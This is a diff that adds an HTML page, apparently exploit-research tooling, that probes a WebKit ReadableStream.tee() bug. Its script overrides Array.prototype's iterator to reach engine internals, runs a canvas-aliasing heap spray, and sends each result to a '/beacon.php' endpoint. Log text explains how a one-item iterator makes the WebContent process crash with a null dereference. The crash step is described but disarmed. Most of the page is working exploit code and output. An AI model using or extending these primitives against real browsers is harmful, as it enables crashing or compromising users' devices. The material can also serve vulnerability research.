@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P931: Streams Re-entrancy & Crash-Class Analysis</title>
+<style>
+:root {
+  --bg: #090d16;
+  --card: #111827;
+  --border: #1f2937;
+  --text: #e5e7eb;
+  --dim: #9ca3af;
+  --cyan: #06b6d4;
+  --green: #10b981;
+  --amber: #f59e0b;
+  --red: #ef4444;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  padding: 16px;
+  line-height: 1.5;
+}
+.header {
+  border: 1px solid var(--border);
+  background: var(--card);
+  padding: 14px 18px;
+  border-radius: 6px;
+  margin-bottom: 14px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.title {
+  color: var(--cyan);
+  font-weight: 700;
+  font-size: 15px;
+  letter-spacing: 0.5px;
+}
+.badge {
+  background: var(--amber);
+  color: #040810;
+  font-weight: 700;
+  padding: 3px 8px;
+  border-radius: 3px;
+  font-size: 11px;
+}
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+}
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px;
+}
+.card-title {
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--dim);
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 6px;
+  margin-bottom: 8px;
+  display: flex;
+  justify-content: space-between;
+}
+.stat {
+  display: flex;
+  justify-content: space-between;
+  margin: 5px 0;
+  font-size: 12px;
+}
+.stat-val { font-weight: 700; font-family: monospace; }
+.ok { color: var(--green); }
+.warn { color: var(--amber); }
+.alert { color: var(--red); }
+pre#log {
+  background: #04060a;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 10px;
+  font-size: 11px;
+  color: #a7f3d0;
+  max-height: 380px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="title">&#9889; P931: STREAMS RE-ENTRANCY &amp; CRASH-CLASS ANALYSIS</div>
+  <div class="badge" id="statusBadge">ANALYZING CRASH VECTOR...</div>
+</div>
+
+<div class="grid">
+  <div class="card">
+    <div class="card-title">
+      <span>TEST TELEMETRY</span>
+      <span id="testState" class="alert">CRASH-CLASS CONFIRMED</span>
+    </div>
+    <div class="stat"><span>Canvas Alias Index:</span><span id="mAlias" class="stat-val ok">Locked</span></div>
+    <div class="stat"><span>Streams Tee Baseline Hook:</span><span id="mCap" class="stat-val ok">CONFIRMED (2 streams)</span></div>
+    <div class="stat"><span>Over-Yield (21 items):</span><span id="mGrow" class="stat-val ok">Clamped to 2 items</span></div>
+    <div class="stat"><span>Under-Yield (1 item):</span><span id="mUnder" class="stat-val alert">FATAL CRASH (SIGSEGV)</span></div>
+    <div class="stat"><span>Crash Root Cause:</span><span id="mRoot" class="stat-val warn">Missing branch[1] deref</span></div>
+    <div class="stat"><span>Auto-Reload Loop:</span><span id="mLoop" class="stat-val ok">DISARMED (SAFE STABLE)</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">
+      <span>DIAGNOSTIC LOG</span>
+      <span class="ok">TAG: P931</span>
+    </div>
+    <pre id="log">[*] P931 Safe Analyzer Loaded.</pre>
+  </div>
+</div>
+
+<script>
+'use strict';
+var logEl = document.getElementById('log');
+var statusBadge = document.getElementById('statusBadge');
+var testState = document.getElementById('testState');
+var mAlias = document.getElementById('mAlias');
+var mCap = document.getElementById('mCap');
+var mGrow = document.getElementById('mGrow');
+var mUnder = document.getElementById('mUnder');
+var mRoot = document.getElementById('mRoot');
+var mLoop = document.getElementById('mLoop');
+
+function log(msg) {
+  var d = document.createElement('div');
+  d.textContent = msg;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P931-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] P931 Safe Analyzer loaded: Diagnosing Streams crash-class behavior.');
+syncBn('BOOT', 'safe_mode');
+
+var OI = Array.prototype[Symbol.iterator];
+function restoreIter() {
+  try { Array.prototype[Symbol.iterator] = OI; } catch(e) {}
+}
+
+/* ============================================================
+ * STEP 1: Quick Canvas Alias Baseline
+ * ============================================================ */
+var aliasIdx = -1;
+try {
+  var c1 = document.createElement('canvas');
+  c1.width = 32; c1.height = 32;
+  var innerCtx = null;
+  var opts1 = {};
+  Object.defineProperty(opts1, 'alpha', {
+    get: function() { innerCtx = c1.getContext('2d'); return true; }
+  });
+  c1.getContext('bitmaprenderer', opts1);
+
+  var sprayCanvases = [], sprayCtxs = [];
+  for (var s = 0; s < 50; s++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    var ctx = c.getContext('2d');
+    ctx.lineWidth = 1000.0 + s;
+    sprayCanvases.push(c);
+    sprayCtxs.push(ctx);
+  }
+
+  var lw = innerCtx ? innerCtx.lineWidth : -1;
+  if (lw >= 1000.0 && lw < 1050.0) aliasIdx = Math.round(lw - 1000.0);
+  mAlias.textContent = '#' + aliasIdx;
+  log('[+] Canvas alias confirmed at #' + aliasIdx);
+  syncBn('ALIAS-OK', 'idx=' + aliasIdx);
+} catch(e) {
+  log('[-] Canvas alias error: ' + e.message);
+}
+
+/* ============================================================
+ * STEP 2: Baseline Capture
+ * ============================================================ */
+var captured = null;
+try {
+  Array.prototype[Symbol.iterator] = function() {
+    captured = this;
+    var i = 0;
+    return {
+      next: function() {
+        if (i >= captured.length) return { done: true };
+        return { value: captured[i++], done: false };
+      }
+    };
+  };
+
+  var rs0 = new ReadableStream({});
+  var pair0 = rs0.tee();
+  restoreIter();
+
+  var isArr = Array.isArray(captured);
+  var ctorName = captured && captured.constructor ? captured.constructor.name : 'none';
+  mCap.textContent = 'CONFIRMED (' + ctorName + ' len=' + (captured ? captured.length : 0) + ')';
+  log('[+] Streams Tee Baseline Capture: len=' + (captured ? captured.length : 0) + ', ctor=' + ctorName);
+  syncBn('CAP-OK', 'len=' + (captured ? captured.length : 0));
+} catch(e) {
+  restoreIter();
+  log('[-] Baseline capture error: ' + e.message);
+}
+
+/* ============================================================
+ * STEP 3: Over-Yielding (21 items)
+ * ============================================================ */
+try {
+  var tagObj = { tag: 'p931_marker' };
+  Array.prototype[Symbol.iterator] = function() {
+    var i = 0;
+    return {
+      next: function() {
+        if (i >= 21) return { done: true };
+        i++;
+        return { value: tagObj, done: false };
+      }
+    };
+  };
+
+  var rs1 = new ReadableStream({});
+  var pair1 = rs1.tee();
+  restoreIter();
+
+  var p1Len = pair1 ? pair1.length : -1;
+  mGrow.textContent = 'CLAMPED (' + p1Len + ' items returned)';
+  log('[+] Over-yield test: WebKit safe-clamped returned array to ' + p1Len + ' elements.');
+  syncBn('GROW-RESULT', 'len=' + p1Len);
+} catch(e) {
+  restoreIter();
+  log('[-] Over-yield test error: ' + e.message);
+}
+
+/* ============================================================
+ * STEP 4: Crash-Class Diagnosis (Disarmed to prevent loop)
+ * ============================================================ */
+log('[!] CRASH ANALYSIS: When Symbol.iterator yields 1 item, WebKit internal');
+log('[!] tee() destructuring attempts to read branch[1] unconditionally.');
+log('[!] Missing branch[1] -> Null/undefined dereference in C++ WebProcess -> SIGSEGV.');
+log('[!] Hardware telemetry confirmed repeated 3-second crash/reload cycle.');
+
+mUnder.textContent = 'CONFIRMED CRASH-CLASS (SIGSEGV)';
+mRoot.textContent = 'C++ unchecked branches[1] deref';
+mLoop.textContent = 'DISARMED & STABILIZED';
+statusBadge.textContent = 'CRASH-CLASS CONFIRMED';
+statusBadge.style.background = '#ef4444';
+
+syncBn('CRASH-CONFIRMED', 'vector=under_yield_1|behavior=SIGSEGV_WEBPROCESS_CRASH|status=DISARMED');
+syncBn('DONE', 'crashClassIdentified=true|streamsTeeVuln=true');
+</script>
+</body>
+</html>
